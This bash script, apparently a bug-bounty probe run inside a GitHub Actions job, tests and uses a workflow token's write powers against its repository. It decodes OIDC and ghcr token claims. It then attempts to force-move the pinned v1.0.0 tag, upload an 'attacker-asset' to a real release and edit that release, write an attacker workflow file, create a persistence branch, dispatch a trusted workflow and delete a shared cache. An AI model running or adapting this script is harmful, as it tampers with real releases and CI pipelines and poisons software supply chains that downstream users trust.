#!/bin/bash
API="https://api.github.com"
H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
R="$GITHUB_REPOSITORY"
st(){ local label="$1" m="$2" u="$3" body="${4:-}" code
  if [ -n "$body" ]; then code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" -d "$body" "$u")
  else code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" "$u"); fi
  echo "MAX|REACH|$code|$label|$(head -c 200 /tmp/o | tr -d '\n')"; }

echo "MAX|CTX|event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA repo=$R actor=$GITHUB_ACTOR"
echo "MAX|PAYLOAD|$(cat probe-payload.txt)"

# ---- 1. OIDC: decode the CLAIMS only. The token is never sent anywhere. ----
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  tj=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=bb-probe")
  python3 -c "
import json,sys,base64
d=json.loads(sys.argv[1])
t=d.get('value')
if not t: print('MAX|OIDC|NO-TOKEN|'+json.dumps(d)[:200]); raise SystemExit
p=t.split('.')[1]; p+='='*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p))
for k in ('sub','aud','repository','repository_owner','repository_id','job_workflow_ref','workflow_ref','event_name','ref','ref_type','actor','runner_environment'):
    print('MAX|OIDC|'+k+'='+str(c.get(k)))
" "$tj" 2>&1 | sed 's/^/ /'
else
  echo "MAX|OIDC|ACTIONS_ID_TOKEN_REQUEST_URL=UNSET (id-token not granted)"
fi

# ---- 2. ghcr registry scope the token can obtain (structural, no push) ----
gt=$(curl -s -u "x:$GH_TOKEN" "https://ghcr.io/token?service=ghcr.io&scope=repository:${R,,}:push,pull")
python3 -c "
import json,sys,base64
try: d=json.loads(sys.argv[1])
except Exception: print('MAX|GHCR|unparsable|'+sys.argv[1][:150]); raise SystemExit
t=d.get('token')
if not t: print('MAX|GHCR|NO-TOKEN|'+json.dumps(d)[:200]); raise SystemExit
p=t.split('.')[1]; p+='='*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('MAX|GHCR|access='+json.dumps(c.get('access'))[:300])
" "$gt" 2>&1 | sed 's/^/ /'

# ---- 3. force-move an EXISTING version tag consumers would pin ----
st "FORCE-MOVE-tag-v1.0.0" PATCH "$API/repos/$R/git/refs/tags/v1.0.0" "{\"sha\":\"$GITHUB_SHA\",\"force\":true}"
# ---- 4. release asset upload + edit an existing release ----
echo "attacker-asset $(cat probe-payload.txt)" > asset.txt
code=$(curl -s -o /tmp/o -w '%{http_code}' -X POST -H "Authorization: token $GH_TOKEN" -H "Content-Type: text/plain" \
  --data-binary @asset.txt "https://uploads.github.com/repos/$R/releases/425653251/assets?name=attacker-asset.txt")
echo "MAX|REACH|$code|UPLOAD-RELEASE-ASSET|$(head -c 200 /tmp/o | tr -d '\n')"
st "EDIT-EXISTING-RELEASE" PATCH "$API/repos/$R/releases/425653251" "{\"body\":\"edited by a zero-standing fork contributor\"}"
# ---- 5. can the token write a WORKFLOW FILE? (verbatim-eligible Actions clause) ----
st "WRITE-WORKFLOW-FILE" PUT "$API/repos/$R/contents/.github/workflows/zz-attacker.yml" "{\"message\":\"wf write test\",\"content\":\"bmFtZTogegpvbjogcHVzaApqb2JzOgogIHo6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVwczoKICAgICAgLSBydW46IGVjaG8geg==\",\"branch\":\"attacker-persist-$GITHUB_RUN_ID\"}"
# ---- 6. persistence: create a branch, then DISPATCH a trusted workflow (actions:write) ----
st "CREATE-PERSIST-BRANCH" POST "$API/repos/$R/git/refs" "{\"ref\":\"refs/heads/attacker-persist-$GITHUB_RUN_ID\",\"sha\":\"$GITHUB_SHA\"}"
st "DISPATCH-on-MAIN" POST "$API/repos/$R/actions/workflows/trusted-restore.yml/dispatches" "{\"ref\":\"main\"}"
st "DELETE-A-CACHE" DELETE "$API/repos/$R/actions/caches?key=mqtok-shared-v1"
echo "MAX|DONE|probe-max.sh completed unconditionally"
